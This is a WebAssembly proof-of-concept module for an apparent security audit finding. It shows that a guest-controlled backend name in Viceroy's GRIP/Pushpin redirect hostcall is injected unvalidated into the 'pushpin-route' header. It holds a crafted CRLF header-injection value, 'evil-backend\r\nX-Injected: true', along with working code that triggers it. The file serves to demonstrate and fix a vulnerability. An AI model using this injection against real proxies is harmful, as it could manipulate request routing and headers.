;; PoC for finding 023: Backend name injected into routing header
;;
;; In src/wiggle_abi/req_impl.rs, redirect_to_grip_proxy passes
;; the guest-controlled backend_name into PushpinRedirectInfo without
;; validation. In src/pushpin.rs:135 this becomes:
;;   req.header("pushpin-route", backend_name.to_string())
;;
;; An attacker can inject arbitrary values into the pushpin-route
;; header, potentially controlling Pushpin's routing behavior.
;;
;; Trigger: serve this module with GRIP/Pushpin support enabled.
;; The guest calls redirect_to_grip_proxy with a crafted backend name.
;;
;; Note: This requires Pushpin support to be enabled in Viceroy config.
;; The hostcall is redirect_to_grip_proxy (in fastly_http_req).

(module
  (import "fastly_http_req" "body_downstream_get"
    (func $req_body_downstream_get (param i32 i32) (result i32)))
  (import "fastly_http_req" "redirect_to_grip_proxy_v2"
    (func $redirect_to_grip_proxy (param i32 i32 i32) (result i32)))

  (memory (export "memory") 1)

  ;; Crafted backend name that will be injected into pushpin-route header
  ;; Contains header injection characters
  (data (i32.const 0) "evil-backend\r\nX-Injected: true")

  ;; Output slots: req=100, body=104

  (func (export "_start")
    ;; Get downstream request
    (call $req_body_downstream_get (i32.const 100) (i32.const 104))
    drop

    ;; Redirect to GRIP proxy with crafted backend name
    ;; The backend_name goes directly into pushpin-route header
    (call $redirect_to_grip_proxy
      (i32.load (i32.const 100))  ;; request handle
      (i32.const 0)               ;; backend name ptr (crafted!)
      (i32.const 30)              ;; backend name len
    )
    drop
  )
)
